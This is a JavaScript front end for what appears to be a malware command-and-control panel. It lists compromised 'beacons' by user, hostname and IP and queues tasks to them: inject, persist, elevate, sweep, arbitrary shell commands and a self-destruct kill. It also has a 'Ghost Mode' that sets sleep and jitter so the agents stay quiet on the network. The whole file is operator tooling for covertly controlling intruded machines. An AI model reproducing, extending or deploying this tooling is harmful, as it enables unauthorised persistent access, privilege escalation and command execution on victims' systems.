let currentAgentId = null;

// DOM Elements
const beaconsContainer = document.getElementById('beacons-container');
const interactionPanel = document.getElementById('interaction-panel');
const noSelection = document.getElementById('no-selection');
const agentIdSpan = document.getElementById('current-agent-id');
const agentIpSpan = document.getElementById('current-agent-ip');
const terminal = document.getElementById('terminal-view');
const cmdInput = document.getElementById('cmd-input');

// Append log to terminal
function appendLog(text, type='normal') {
    const div = document.createElement('div');
    div.className = 'log';
    if(type === 'error') div.classList.add('log-error');
    if(type === 'cmd') div.classList.add('cmd-echo');
    div.innerText = text;
    terminal.appendChild(div);
    terminal.scrollTop = terminal.scrollHeight;
}

// Fetch Beacons
async function fetchBeacons() {
    try {
        const res = await fetch('/api/admin/beacons');
        if(!res.ok) {
            if(res.status === 401) window.location.href = '/login';
            return;
        }
        const data = await res.json();
        renderBeacons(data);
    } catch(err) {
        console.error("Fetch beacons err:", err);
    }
}

// Render Beacons on Sidebar
function renderBeacons(agents) {
    beaconsContainer.innerHTML = '';
    
    if(Object.keys(agents).length === 0) {
        beaconsContainer.innerHTML = '<p style="color:var(--text-secondary); font-size:13px; text-align:center; padding: 20px;">No active beacons detected.</p>';
        return;
    }

    for (const [id, info] of Object.entries(agents)) {
        const card = document.createElement('div');
        card.className = 'beacon-card';
        if (id === currentAgentId) card.classList.add('active');
        
        card.innerHTML = `
            <div class="beacon-info">
                <h3><span class="status-indicator"></span>${id}</h3>
                <p>${info.user} @ ${info.hostname}</p>
                <p style="margin-top:4px; font-size:11px; opacity:0.8;">OS: ${info.os}</p>
            </div>
            <div style="text-align: right; font-size: 11px; color: var(--text-secondary);">
                <div>${info.ip}</div>
                <div style="margin-top:4px;">Ping: ${info.last_seen}</div>
            </div>
        `;
        
        card.onclick = () => selectAgent(id, info);
        beaconsContainer.appendChild(card);
    }
}

// Select a Beacon
function selectAgent(id, info) {
    currentAgentId = id;
    agentIdSpan.innerText = id;
    agentIpSpan.innerText = `${info.user}@${info.hostname} (${info.ip})`;
    
    noSelection.style.display = 'none';
    interactionPanel.classList.add('show');
    
    // Re-render styles
    document.querySelectorAll('.beacon-card').forEach(c => c.classList.remove('active'));
    event.currentTarget.classList.add('active');
    
    appendLog(`>>> Attached to session [${id}]`, 'cmd');
    cmdInput.focus();
}

// Send Command via API
async function sendCmdToApi(command, args, displayCmd) {
    if(!currentAgentId) return;
    
    appendLog(`$ ${displayCmd}`, 'cmd');
    
    try {
        const res = await fetch('/api/admin/tasks', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ agent_id: currentAgentId, command: command, args: args })
        });
        const data = await res.json();
        
        if(data.error) appendLog(`[!] Err: ${data.error}`, 'error');
        else appendLog(`[Encolado] ${data.msg || 'Task ID: ' + data.task_id}`);
    } catch(err) {
        appendLog(`[!] Network Error: ${err}`, 'error');
    }
}

// Handler for Enter Key
function handleEnter(e) {
    if(e.key === 'Enter') sendCmd();
}

// Parse and send command
function sendCmd() {
    const raw = cmdInput.value.trim();
    if(!raw) return;
    cmdInput.value = '';
    
    const parts = raw.split(' ');
    const base = parts[0].toLowerCase();
    const args = parts.slice(1).join(' ');
    
    if(['inject', 'sweep', 'watch', 'persist', 'sleep', 'elevate', 'kill'].includes(base)) {
        sendCmdToApi(base, args, raw);
    } else {
        // Asumir shell nativo
        sendCmdToApi('shell', raw, `shell ${raw}`);
    }
}

// Quick UI Buttons
function quickTask(display, cmd, args='') {
    sendCmdToApi(cmd, args, display);
}

function quickKill() {
    if(confirm("ATENCIÓN: Borrará el agente del host y de la BD. ¿Seguro?")) {
        quickTask('kill (Self-Destruct)', 'kill');
        setTimeout(() => {
            currentAgentId = null;
            interactionPanel.classList.remove('show');
            noSelection.style.display = 'flex';
        }, 1000);
    }
}

let isInteractive = false;
let pollingInterval = null;

function toggleInteractive(enable) {
    isInteractive = enable;
    if(enable) {
        quickTask('Switching to Real-Time PTY (0.5s Sleep, No Jitter)...', 'sleep', '0.5 0');
        appendLog('[*] Real-Time Terminal enabed (Warning: Network Noisy)', 'cmd');
        clearInterval(pollingInterval);
        pollingInterval = setInterval(pollResults, 500); // 500ms Instant Polling
    } else {
        quickTask('Reverting to Ghost Mode (300s Sleep, 30% Jitter)...', 'sleep', '300 0.3');
        appendLog('[*] Ghost Mode enabled (Silent Sleep)', 'cmd');
        clearInterval(pollingInterval);
        pollingInterval = setInterval(pollResults, 3000); // 3s UI Polling
    }
}

// Poll for Results
async function pollResults() {
    try {
        const res = await fetch('/api/admin/results');
        if(!res.ok) return;
        const data = await res.json();
        
        for(const [tid, payload] of Object.entries(data)) {
            // Si hay output
            if(payload.output) {
                appendLog(`\n--- Respuesta [${tid}] ---`);
                appendLog(payload.output);
            }
            if(payload.error) {
                appendLog(`\n--- Error [${tid}] ---`, 'error');
                appendLog(payload.error, 'error');
            }
        }
    } catch(err) {}
}

// Start Background Loop
setInterval(fetchBeacons, 2000);
pollingInterval = setInterval(pollResults, 3000); // UI Polling lento por defecto

// Initial Load
fetchBeacons();
